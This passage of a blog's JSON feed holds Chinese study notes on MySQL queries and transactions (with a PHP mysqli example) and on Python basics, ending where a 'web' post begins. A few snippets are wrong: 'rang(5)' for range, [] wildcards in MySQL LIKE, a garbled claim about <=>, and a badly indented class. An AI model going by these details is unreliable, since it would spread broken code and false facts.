keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"没有找到记录\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">...</span></pre></td></tr></table></figure><h6 id=\"2使用-mysqli_fetch_assoc\"><a class=\"anchor\" href=\"#2使用-mysqli_fetch_assoc\">#</a> 2. 使用 mysqli_fetch_assoc</h6>\n<p>没行返回 null，但是也可以结束 while</p>\n<p><code>mysqli_fetch_assoc($result)</code> , 返回的直接是关联数组</p>\n<p>相当于</p>\n<p><code>mysqli_fetch_array($result,MYSQLI_ASSOC) </code></p>\n<h6 id=\"3内存释放\"><a class=\"anchor\" href=\"#3内存释放\">#</a> 3. 内存释放</h6>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$retval</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mysqli_free_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$retval</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"where子句\"><a class=\"anchor\" href=\"#where子句\">#</a> where 子句</h5>\n<p>类似于 if 语句，判断真假，使用 <code>AND</code>  和 <code>OR</code>  组合， <code>LIKE</code>  模糊匹配</p>\n<p>一般的：</p>\n<pre><code class=\"language-mysql\">...WHERE username = 'test';\n...salary &gt;= 50000;\n</code></pre>\n<p>对于日期时间类型：</p>\n<pre><code class=\"language-mysql\">...WHERE order_date BETWEEN '2023-01-01' AND '2023-12-31';\n</code></pre>\n<p>对于可空的：</p>\n<pre><code class=\"language-mysql\">...WHERE email IS [NOT] NULL;\n</code></pre>\n<p>默认的字符串比较不区分大小写（非 like 子句），如果要，写成：</p>\n<pre><code class=\"language-mysql\">...WHERE BINARY...\n</code></pre>\n<h5 id=\"like子句\"><a class=\"anchor\" href=\"#like子句\">#</a> LIKE 子句</h5>\n<p>代替等号用于 where 子句（或者 having 子句）</p>\n<p>可使用的通配符包括：</p>\n<p><code>%</code> \t表示没有或者有任意个任意字符</p>\n<p><code>_</code> \t表示一个任意字符</p>\n<p>其他匹配方式：</p>\n<p><code>[]</code> / <code>[^]</code> \t类似正则表达式，查询内容包含通配符时，可以用这个括起</p>\n<p>可以组合使用，比如：a% o_</p>\n<p>like 子句是否区分大小写取决于字符集</p>\n<p>不区分是：</p>\n<blockquote>\n<p>SELECT * FROM employees WHERE last_name LIKE 'smi%' <strong>COLLATE utf8mb4_general_ci</strong>;</p>\n</blockquote>\n<h4 id=\"合并查询数据union\"><a class=\"anchor\" href=\"#合并查询数据union\">#</a> 合并查询数据（UNION）</h4>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ... FROM table1 WHERE condition1\nUNION           //加中间就行，可以叠叠乐\nSELECT column1, column2, ... FROM table2 WHERE condition2\n[ORDER BY column1, column2, ...];  //可选，排序合并后的数据\n</code></pre>\n<p>注意：1. 会自动去除重复行（使用<strong> UNION ALL</strong> 则不会，性能还会更好）。</p>\n<p>​\t\t\t2. 每个 SELECT 语句的列数和对应位置的数据类型必须相同（即使来自不同表）。</p>\n<h4 id=\"排序\"><a class=\"anchor\" href=\"#排序\">#</a> 排序</h4>\n<p>ORDER BY 子句，排序查询后的数据</p>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ...\nFROM table_name\nORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...;\n</code></pre>\n<p>默认 ASC（升序）。DESC 是降序</p>\n<p>像上面那个多列排序，就是先按 column1, 再按 column2</p>\n<p>可以不用列名而用数字表示列的位置，例如：</p>\n<pre><code class=\"language-mysql\">ORDER BY 3 DESC, 1 ASC;\n</code></pre>\n<p>8.0 以上的版本，末尾有可选参数：</p>\n<p><code>NULLS FIRST</code>  或 <code>NULLS LAST</code>   ，表示排序时 NULL 的位置</p>\n<blockquote>\n<p>注意：</p>\n<p>如果字符集是 utf-8，而不是 GBK，排序时要先转码：</p>\n<pre><code class=\"language-mysql\">SELECT * \nFROM runoob_tbl\nORDER BY CONVERT(runoob_title using gbk);\n</code></pre>\n</blockquote>\n<h4 id=\"分组\"><a class=\"anchor\" href=\"#分组\">#</a> 分组</h4>\n<p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p>\n<p>在分组的列上我们可以使用 COUNT, SUM, AVG, 等函数。</p>\n<pre><code class=\"language-mysql\">SELECT column1, column2, aggregate_function(column3)\nFROM TABLE_NAME\nWHERE condition\nGROUP BY column1, column2;\n</code></pre>\n<h5 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h5>\n<pre><code class=\"language-mysql\">SELECT customer_id, SUM(order_amount) AS total_amount\nFROM orders\nGROUP BY customer_id;\n//计算每个客户的订单总金额\n</code></pre>\n<ul>\n<li><code>GROUP BY</code>  子句通常与聚合函数一起使用，因为分组后需要对每个组进行聚合操作。</li>\n<li><code>SELECT</code>  子句中的列通常<strong>要么是分组列</strong>（ <code>GROUP BY</code>  使用的列），<strong>要么是聚合函数的参数</strong>。</li>\n<li>可以使用多个列进行分组，只需在  <code>GROUP BY</code>  子句中用逗号分隔列名即可。</li>\n</ul>\n<p>聚合函数：</p>\n<p>如  <code>SUM</code> 、 <code>AVG</code> 、 <code>COUNT</code> 、 <code>MIN</code> 、 <code>MAX</code>  等，用于对每个分组的数据进行汇总计算。</p>\n<h5 id=\"使用with-rollup\"><a class=\"anchor\" href=\"#使用with-rollup\">#</a> 使用 WITH ROLLUP</h5>\n<p>可选子句，实现在分组统计数据基础上再进行相同的统计</p>\n<p>对比一下：</p>\n<blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> SELECT name,SUM<span class=\"token punctuation\">(</span>signin<span class=\"token punctuation\">)</span> as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+--------+--------------+</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> name   <span class=\"token operator\">|</span> signin_count <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+--------+--------------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> 小丽 <span class=\"token operator\">|</span>            <span class=\"token number\">2</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> 小明 <span class=\"token operator\">|</span>            <span class=\"token number\">7</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> 小王 <span class=\"token operator\">|</span>            <span class=\"token number\">7</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> NULL   <span class=\"token operator\">|</span>           <span class=\"token number\">16</span> <span class=\"token operator\">|</span>      //NULL表示所有人的登录次数，因为这列相加没有意义</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>+--------+--------------+</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">4</span> rows <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以及</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> SELECT name, COUNT<span class=\"token punctuation\">(</span>*<span class=\"token punctuation\">)</span> FROM employee_tbl GROUP BY name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+--------+----------+</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> name   <span class=\"token operator\">|</span> COUNT<span class=\"token punctuation\">(</span>*<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+--------+----------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> 小丽 <span class=\"token operator\">|</span>        <span class=\"token number\">1</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> 小明 <span class=\"token operator\">|</span>        <span class=\"token number\">3</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> 小王 <span class=\"token operator\">|</span>        <span class=\"token number\">2</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>+--------+----------+</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3</span> rows <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.01</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>为了避免 NULL, 可以使用</p>\n<pre><code class=\"language-mysql\">select coalesce(a,b,c);\n//按顺序判断是否为NULL,返回遇到的第一个非NULL值。（全NULL就返回NULL）\n</code></pre>\n<p>于是可改成：</p>\n<pre><code class=\"language-mysql\">SELECT coalesce(name, '总数'), SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;\n</code></pre>\n</blockquote>\n<h3 id=\"多表查询join\"><a class=\"anchor\" href=\"#多表查询join\">#</a> 多表查询（JOIN）</h3>\n<ul>\n<li><strong>INNER JOIN（内连接，或等值连接）</strong>：获取两个表中字段匹配关系的记录，可以简写为 JOIN。</li>\n<li>**LEFT JOIN（左连接）：** 获取左表所有记录，即使右表没有对应匹配的记录。</li>\n<li><strong>RIGHT JOIN（右连接）：</strong> 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li>\n</ul>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ...\nFROM table1\nINNER JOIN table2 \nON table1.column_name = table2.column_name;\n//只返回两表中column_name内容相同的行\n//SELECT中的列也要写成类似于table.column的形式，不必包含ON使用的那列\n</code></pre>\n<p>可以叠叠乐：</p>\n<pre><code class=\"language-mysql\">SELECT orders.order_id, customers.customer_name, products.product_name\nFROM orders\nINNER JOIN customers ON orders.customer_id = customers.customer_id\nINNER JOIN order_items ON orders.order_id = order_items.order_id\nINNER JOIN products ON order_items.product_id = products.product_id;\n//此时只有在四个表的所选列中都存在的才会返回对应的SELECT\n</code></pre>\n<p>LEFT/RIGHT JOIN</p>\n<p>以 LEFT JOIN 为例，RIGHT JOIN 反之</p>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ...\nFROM table1\nLEFT JOIN table2 \nON table1.column_name = table2.column_name;\n[WHERE 条件]\n//返回左表中所有行的情况下。当右表中没有匹配的行时，相关列将显示为 NULL。\n</code></pre>\n<h3 id=\"null值处理\"><a class=\"anchor\" href=\"#null值处理\">#</a> NULL 值处理</h3>\n<p>WHERE 子句</p>\n<p><code>is (not) null</code></p>\n<p>ORDER BY 子句:</p>\n<p><code>NULLS FIRST/LAST</code></p>\n<h4 id=\"用于比较\"><a class=\"anchor\" href=\"#用于比较\">#</a> 用于比较</h4>\n<pre><code class=\"language-mysql\">SELECT * FROM employees WHERE commission &lt;=&gt; NULL;\n`&lt;=&gt;`是比较表达式是否相等的特殊操作符，可以直接替换`=`\n都是NULL就返回TRUE\n注意：回值始终是NULL\n</code></pre>\n<h4 id=\"聚合函数\"><a class=\"anchor\" href=\"#聚合函数\">#</a> 聚合函数</h4>\n<p>会被忽略</p>\n<p>如果想指定为特定值，可以套个 COALESCE 或者它的下位 IFNULL（只接受俩参数）</p>\n<p>例如： <code>AVG(COALESCE(salary, 0))</code>  或者 <code>AVG(IFNULL(salary, 0))</code></p>\n<h2 id=\"正则表达式\"><a class=\"anchor\" href=\"#正则表达式\">#</a> 正则表达式</h2>\n<blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">模式</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">^</td>\n<td style=\"text-align:left\">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\\n' 或 '\\r' 之后的位置。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">$</td>\n<td style=\"text-align:left\">匹配输入字符串的结束位置。如果设置了 RegExp 对象的 Multiline 属性，$ 也匹配 '\\n' 或 '\\r' 之前的位置。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">.</td>\n<td style=\"text-align:left\">匹配除 &quot;\\n&quot; 之外的任何单个字符。要匹配包括 '\\n' 在内的任何字符，请使用像 '[.\\n]' 的模式。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[...]</td>\n<td style=\"text-align:left\">字符集合。匹配所包含的任意一个字符。例如， '[abc]' 可以匹配 &quot;plain&quot; 中的 'a'。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[^...]</td>\n<td style=\"text-align:left\">负值字符集合。匹配未包含的任意字符。例如， '[^abc]' 可以匹配 &quot;plain&quot; 中的 'p'。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">p1|p2|p3</td>\n<td style=\"text-align:left\">匹配 p1 或 p2 或 p3。例如，'z|food' 能匹配 &quot;z&quot; 或 &quot;food&quot;。'(z|f) ood' 则匹配 &quot;zood&quot; 或 &quot;food&quot;。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">*</td>\n<td style=\"text-align:left\">匹配前面的子表达式零次或多次。例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于 {0,}。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">+</td>\n<td style=\"text-align:left\">匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 {1,}。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\" n=\"\"></td>\n<td style=\"text-align:left\">n 是一个非负整数。匹配确定的 n 次。例如，'o {2}' 不能匹配 &quot;Bob&quot; 中的 'o'，但是能匹配 &quot;food&quot; 中的两个 o。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\" n,m=\"\"></td>\n<td style=\"text-align:left\">m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"正则表达式匹配的字符类\"><a class=\"anchor\" href=\"#正则表达式匹配的字符类\">#</a> 正则表达式匹配的字符类</h3>\n<ul>\n<li><code>.</code> ：匹配任意单个字符。</li>\n<li><code>^</code> ：匹配字符串的开始。</li>\n<li><code>$</code> ：匹配字符串的结束。</li>\n<li><code>*</code> ：匹配零个或多个前面的元素。</li>\n<li><code>+</code> ：匹配一个或多个前面的元素。</li>\n<li><code>?</code> ：匹配零个或一个前面的元素。</li>\n<li><code>[abc]</code> ：匹配字符集中的任意一个字符。</li>\n<li><code>[^abc]</code> ：匹配除了字符集中的任意一个字符以外的字符。</li>\n<li><code>[a-z]</code> ：匹配范围内的任意一个小写字母。</li>\n<li><code>[0-9]</code> ：匹配一个数字字符。</li>\n<li><code>\\w</code> ：匹配一个字母数字字符（包括下划线）。</li>\n<li><code>\\s</code> ：匹配一个空白字符。</li>\n</ul>\n</blockquote>\n<h3 id=\"regexprlike\"><a class=\"anchor\" href=\"#regexprlike\">#</a> REGEXP/RLIKE</h3>\n<p>这两者等同</p>\n<pre><code class=\"language-mysql\">SELECT column1, column2, ...\nFROM table_name\nWHERE column_name REGEXP [BINARY] 'pattern';\n//'pattern'是一个正则表达式模式,例如：'^[aeiou]|ok$'，'item[0-9]+'等\n//使用BINARY关键字，匹配区分大小写\n</code></pre>\n<h2 id=\"事务\"><a class=\"anchor\" href=\"#事务\">#</a> 事务</h2>\n<p>要么全部执行，要么都不执行</p>\n<p>用来管理 <strong>insert、update、delete</strong> 语句</p>\n<h3 id=\"控制语句\"><a class=\"anchor\" href=\"#控制语句\">#</a> 控制语句</h3>\n<blockquote>\n<ul>\n<li>BEGIN 或 START TRANSACTION 显式地开启一个事务；</li>\n<li>COMMIT/COMMIT WORK，二者等价。提交事务，此时才真正修改，不可逆；</li>\n<li>ROLLBACK/ROLLBACK WORK，二者等价。结束用户的事务，并撤销正在进行的所有未提交的修改；</li>\n<li>SAVEPOINT identifier，在事务中创建保存点，可以有多个；</li>\n<li>RELEASE SAVEPOINT identifier 删除保存点，不存在时抛出异常；</li>\n<li>ROLLBACK TO identifier 把事务回滚到保存点；</li>\n<li><strong>SET TRANSACTION</strong> 用来设置事务的隔离级别。</li>\n<li><strong>SET AUTOCOMMIT=0</strong> 禁止自动提交</li>\n<li><strong>SET AUTOCOMMIT=1</strong> 开启自动提交</li>\n</ul>\n</blockquote>\n<p>实例：</p>\n<pre><code class=\"language-mysql\">START TRANSACTION;\nUPDATE accounts SET balance = balance - 100 WHERE user_id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE user_id = 2;\n-- 判断是否要提交还是回滚\nIF (条件) THEN\n    COMMIT; -- 提交事务\nELSE\n    ROLLBACK; -- 回滚事务\nEND IF;\n</code></pre>\n<h3 id=\"隔离级别\"><a class=\"anchor\" href=\"#隔离级别\">#</a> 隔离级别</h3>\n<p>InnoDB 存储引擎提供事务的隔离级别有 READ UNCOMMITTED、READ COMMITTED、REPEATABLE READ 和 SERIALIZABLE。</p>\n<h4 id=\"读未提交\"><a class=\"anchor\" href=\"#读未提交\">#</a> 读未提交</h4>\n<p><code>READ UNCOMMITTED</code></p>\n<p>可以读取到其他事务尚未提交的数据，最低级别</p>\n<p>可能<strong>脏读（被读取的事务最终回滚导致所读的数据无效）</strong></p>\n<h4 id=\"读已提交\"><a class=\"anchor\" href=\"#读已提交\">#</a> 读已提交</h4>\n<p><code>READ COMMITTED</code></p>\n<p>只能读取到其他事务已经提交的数据</p>\n<p>不会脏读</p>\n<p>但由于不可重复读，可能导致多次读取同一数据的值不一样</p>\n<h4 id=\"可重复读\"><a class=\"anchor\" href=\"#可重复读\">#</a> 可重复读</h4>\n<p><code>REPEATABLE READ</code></p>\n<p>多次读取同一数据始终保持一致 ，被读事务进行的修改和提交不会改变读取结果</p>\n<p>不会脏读</p>\n<p>可能幻读</p>\n<blockquote>\n<p>原理：</p>\n<p>可重复读默认对读取行加一个快照，此后该事务读取该行都是用快照（可以改为加共享锁）</p>\n<p>所以不脏读。</p>\n<p>但是如果其他事务增加满足查询条件的行，查询会多出一条</p>\n<p>导致幻读。</p>\n</blockquote>\n<p>// 非串行化都可能幻读</p>\n<p>// 行级锁分两种：共享锁（S 锁），其他事务可读不写；排他锁（X 锁），其他事务不</p>\n<p>读不写。一行同时只能一个锁。带有锁的行被其他事务读取时，必须等待其释放（上锁</p>\n<p>的事务提交或回滚）</p>\n<p>可以自行加锁：</p>\n<pre><code class=\"language-mysql\">SELECT price FROM products WHERE id = 1 LOCK IN SHARE MODE;   -- 加共享锁\nSELECT price FROM products WHERE id = 1 FOR UPDATE; -- 加排他锁\n</code></pre>\n<p>如果太久不释放行级锁，等待释放的事务会收到超时报错</p>\n<p>例如：</p>\n<p>在可重复读下</p>\n<pre><code class=\"language-mysql\">-- 事务 A 开始\nSTART TRANSACTION;\n-- 事务 A 读取数据\nSELECT price FROM products WHERE id = 1; -- 假设读取到价格为 100\n-- 如果改用共享锁，事务B会等待事务A释放锁\n\n-- 事务 B 开始\nSTART TRANSACTION;\n-- 事务 B 修改数据\nUPDATE products SET price = 200 WHERE id = 1;\n-- 事务 B 提交\nCOMMIT;\n\n-- 事务 A 再次读取数据\nSELECT price FROM products WHERE id = 1; \n-- 仍然会读取到价格为 100，因为事务 A 读取的是快照中的数据\n-- 事务 A 提交\nCOMMIT;\n</code></pre>\n<p>容易死锁（互相等释放）</p>\n<pre><code class=\"language-mysql\">-- 事务 A\nSTART TRANSACTION;\nSELECT price FROM products WHERE id = 1 LOCK IN SHARE MODE;\nSELECT price FROM products WHERE id = 2 FOR UPDATE; -- 尝试获取 id = 2 的排他锁\n\n-- 事务 B\nSTART TRANSACTION;\nSELECT price FROM products WHERE id = 2 LOCK IN SHARE MODE;\nSELECT price FROM products WHERE id = 1 FOR UPDATE; -- 尝试获取 id = 1 的排他锁\n</code></pre>\n<h4 id=\"串行化\"><a class=\"anchor\" href=\"#串行化\">#</a> 串行化</h4>\n<p>串行执行，最高级别</p>\n<p>不是并发，所以不会幻读，但导致事务之间会相互阻塞，会极大地降低系统的吞吐量。</p>\n<h3 id=\"事务实例\"><a class=\"anchor\" href=\"#事务实例\">#</a> 事务实例</h3>\n<pre><code class=\"language-php+HTML\">&lt;?php\n$dbhost = 'localhost';  // mysql服务器主机地址\n$dbuser = 'root';            // mysql用户名\n$dbpass = '123456';          // mysql用户名密码\n$conn = mysqli_connect($dbhost, $dbuser, $dbpass);\nif(! $conn )\n&#123;\n    die('连接失败: ' . mysqli_error($conn));\n&#125;\n// 设置编码，防止中文乱码\nmysqli_query($conn, &quot;set names utf8&quot;);\nmysqli_select_db( $conn, 'RUNOOB' );\nmysqli_query($conn, &quot;SET AUTOCOMMIT=0&quot;); // 设置为不自动提交，因为MYSQL默认立即执行\nmysqli_begin_transaction($conn);            // 开始事务定义\n \nif(!mysqli_query($conn, &quot;insert into runoob_transaction_test (id) values(8)&quot;))\n&#123;\n    mysqli_query($conn, &quot;ROLLBACK&quot;);     // 判断当执行失败时回滚\n&#125;\n \nif(!mysqli_query($conn, &quot;insert into runoob_transaction_test (id) values(9)&quot;))\n&#123;\n    mysqli_query($conn, &quot;ROLLBACK&quot;);      // 判断执行失败时回滚\n&#125;\nmysqli_commit($conn);            //执行事务\nmysqli_close($conn);\n?&gt;\n</code></pre>\n",
            "tags": [
                "技术",
                "SQL"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/11/python%E7%AC%94%E8%AE%B01/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/11/python%E7%AC%94%E8%AE%B01/",
            "title": "python，然而完全没有关系",
            "date_published": "2024-10-11T09:48:50.000Z",
            "content_html": "<h4 id=\"一按位运算\"><a class=\"anchor\" href=\"#一按位运算\">#</a> 一。按位运算</h4>\n<p>&amp;         #按位与           3 &amp; 2  = 2         （全为 1 时为 1）</p>\n<p>|          #按位或           3 | 2  = 3          （其中一个是 1 时取 1）</p>\n<dl>\n<dt>^          #按位异或       3 ^ 2  = 1          （1 和 0 时为 1）</dt>\n<dd>\n<pre><code>     #按位取反       ~3  = −4            （就是反过来而已）\n</code></pre>\n</dd>\n</dl>\n<p>&lt;&lt;        #向左移位       3 &lt;&lt; 1  = 6</p>\n<p>&gt;&gt;        #向右移位        3 &gt;&gt; 1  =  1</p>\n<blockquote>\n<p>:: 在二进制中移位，空位全部补 0</p>\n</blockquote>\n<h4 id=\"二输入输出\"><a class=\"anchor\" href=\"#二输入输出\">#</a> <strong>二。输入输出</strong></h4>\n<blockquote>\n<p>::input 输入的数据默认都是 str</p>\n</blockquote>\n<h4 id=\"三三目运算符\"><a class=\"anchor\" href=\"#三三目运算符\">#</a> <strong>三。三目运算符</strong></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>age<span class=\"token operator\">=</span><span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>message<span class=\"token operator\">=</span><span class=\"token string\">\"成年人\"</span> <span class=\"token keyword\">if</span> age<span class=\"token operator\">>=</span><span class=\"token number\">18</span> <span class=\"token keyword\">else</span> <span class=\"token string\">\"未成年人\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#这样可以不用写那么多判断语句，可以直接夹在赋值语句里</span></pre></td></tr></table></figure><h4 id=\"四循环\"><a class=\"anchor\" href=\"#四循环\">#</a> <strong>四。循环</strong></h4>\n<h5 id=\"1关于for\"><a class=\"anchor\" href=\"#1关于for\">#</a> 1. 关于 for</h5>\n<p>rang (), 用于生成数值序列，不过计数是从 0 开始。所以：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> rang<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#输出是 0 到 4</span></pre></td></tr></table></figure><h5 id=\"2关于while\"><a class=\"anchor\" href=\"#2关于while\">#</a> 2. 关于 while</h5>\n<p>continue：跳过当前迭代，直接进入下一次（如有），在这之后的不会执行，所以会和 i 一起用</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#输出没有 3</span></pre></td></tr></table></figure><p>EX    break：直接跳出 while 循环</p>\n<blockquote>\n<p>//for 和 while 都可以跟 else 连用，正常终止时执行，被打断时一起被跳过</p>\n</blockquote>\n<p>五。函数</p>\n<p>def 函数名 (参数):</p>\n<p>​       函数体</p>\n<p>#如果要返回值，则使用 return</p>\n<blockquote>\n<p>// 空函数写 pass</p>\n</blockquote>\n<p>默认参数与可选参数：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sum_numbers</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#这里的 * 表示任意数量的非关键字参数，若为 ** 则表示任意数量的关键字参数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>result <span class=\"token operator\">=</span> sum_numbers<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 输出: 10</span></pre></td></tr></table></figure><p>非关键字参数的值不会赋值给该关键字</p>\n<h4 id=\"五类class\"><a class=\"anchor\" href=\"#五类class\">#</a> <strong>五。类（class）</strong></h4>\n<p>// 用于封装数据（属性）和操作方法（函数），调用时可提供特定功能。</p>\n<p>//python 中有内置的类</p>\n<p>#Python 中一切都是对象，对象是类的实例，连 int 和 float 都是类</p>\n<h5 id=\"1创建类\"><a class=\"anchor\" href=\"#1创建类\">#</a> 1. 创建类</h5>\n<pre><code>class Dog:\n\tdef __init__(self): # 初始化函数\n\tself.Race = 'dog'\n\tdef call(self): # 方法\n\tprint('wang')\n</code></pre>\n",
            "tags": [
                "发电",
                "发电"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/11/Web%E6%96%B9%E5%90%91/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/11/Web%E6%96%B9%E5%90%91/",
            "title": "web",
            "date_published": "2024-10-11T09:48:50.000Z",
